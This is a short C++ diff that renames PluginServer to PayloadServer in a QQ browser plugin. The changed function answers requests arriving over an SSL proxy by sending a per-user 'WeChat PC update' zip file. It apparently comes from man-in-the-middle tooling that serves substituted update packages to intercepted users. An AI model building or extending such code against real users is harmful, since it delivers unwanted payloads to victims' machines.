@@ -5,7 +5,7 @@
 #include "../cipher/CryptoUtils.h"
 #include "../version.h"
 #include "../FileOper.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../Utils/simpleJson.h"
 
 int gQQFlag = 1;
@@ -120,7 +120,7 @@ int QQBrowserPlugin::sendQQClubApp(char * dstbuf, int dstbuflimit, LPSSLPROXYPAR
 		return FALSE;
 	}
 	string filename = Public::getUserUrl(lpssl->username, WEIXIN_PC_UPDATE_ZIP_FILENAME);
-	ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szrespformat, 1);
+	ret = PayloadServer::SendPluginFile(filename.c_str(), lpssl, szrespformat, 1);
 	return 0;
 
 }
